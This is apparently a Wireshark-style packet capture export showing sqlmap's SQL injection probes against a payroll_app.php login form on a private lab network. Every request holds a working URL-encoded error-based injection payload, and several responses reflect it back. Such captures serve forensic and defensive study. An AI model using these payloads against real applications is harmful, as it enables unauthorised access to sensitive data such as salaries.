frame.number	ip.src	tcp.srcport	ip.dst	tcp.dstport	http.file_data	http.user_agent	http.request.full_uri
301	192.168.1.3	37882	192.168.2.2	80	user=EaKp%27%29%20AND%203876%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283876%3D3876%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27Bocp%27%3D%27Bocp&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
305	192.168.2.2	80	192.168.1.3	37882	\n\n		
316	192.168.1.3	37888	192.168.2.2	80	user=EaKp%27%20AND%203876%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283876%3D3876%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27jFbe%27%3D%27jFbe&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
319	192.168.2.2	80	192.168.1.3	37888	\n\n		
325	192.168.1.3	37886	192.168.2.2	80	user=EaKp%29%20AND%203876%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283876%3D3876%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%285804%3D5804&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
328	192.168.2.2	80	192.168.1.3	37886	\n\n<center><h2>Welcome, EaKp) AND 3876=CAST((CHR(113)||CHR(106)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (3876=3876) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC) AND (5804=5804</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
337	192.168.1.3	37890	192.168.2.2	80	user=EaKp%20AND%203876%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283876%3D3876%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
340	192.168.2.2	80	192.168.1.3	37890	\n\n<center><h2>Welcome, EaKp AND 3876=CAST((CHR(113)||CHR(106)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (3876=3876) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC)</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
352	192.168.1.3	37894	192.168.2.2	80	user=EaKp%20AND%203876%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283876%3D3876%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20RKta&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
355	192.168.2.2	80	192.168.1.3	37894	\n\n<center><h2>Welcome, EaKp AND 3876=CAST((CHR(113)||CHR(106)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (3876=3876) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC)-- RKta</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
361	192.168.1.3	37892	192.168.2.2	80	user=EaKp%27%29%20AND%204287%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284287%3D4287%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%20AND%20%28%27AKwc%27%3D%27AKwc&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
367	192.168.2.2	80	192.168.1.3	37892	\n\n		
373	192.168.1.3	37896	192.168.2.2	80	user=EaKp%27%20AND%204287%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284287%3D4287%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%20AND%20%27xFyc%27%3D%27xFyc&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
379	192.168.2.2	80	192.168.1.3	37896	\n\n<center><h2>Welcome, EaKp' AND 4287 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (4287=4287) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(120)+CHAR(113))) AND 'xFyc'='xFyc</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
385	192.168.1.3	37898	192.168.2.2	80	user=EaKp%29%20AND%204287%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284287%3D4287%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%20AND%20%281672%3D1672&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
